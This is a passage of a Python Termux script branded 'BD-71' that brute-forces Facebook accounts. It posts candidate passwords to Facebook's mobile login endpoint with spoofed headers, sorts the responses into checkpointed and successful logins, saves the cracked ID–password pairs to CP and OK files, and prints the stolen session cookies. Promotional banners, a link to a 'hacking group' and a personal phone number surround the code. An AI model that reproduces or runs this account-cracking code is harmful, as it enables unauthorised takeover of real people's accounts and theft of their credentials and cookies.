...
print('\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mCHCEING UPDATE...? ')
time.sleep(5)
os.system('clear')
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN MY TERMUX HACKING GURUP")
time.sleep(2)
os.system(f'xdg-open https://www.facebook.com/groups/554714119911648/?mibextid=y8rfaViCqr9mkxpQ /')
#------------------[ BD-71 ]-------------------#
#------------------[ USER-AGENT ]-------------------#
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mBD-71 ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • BD-71 ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38m BD-71 ]   ║\33[1;34m   
╠══[Whatsapp                 • 01876774712 ]  ║\33[1;35m 
╠══[TOOLS                    • FREE ]         ║ \33[1;32m   
...
os.system('espeak -a 300 " Welcome,   to,  BD,  71,  Tools"')
pass
...
def menu():
    ...
    if TUTUL in ['111']:
        ...
        os.system('xdg-open https://wa.me/+8801876774712')
        os.system("python nono.py")
    elif TUTUL in ['3','03']:
        result()
    elif TUTUL in ['0']:
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[Hack-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[HACK-DONE-OK💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " HACK,  DONE,  id"')
...
def crackfree(idf,pwv):
    ...
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•Hack-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Hack-done] {idf} • {pw} ')
                os.system('espeak -a 300 " Hack,  done,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
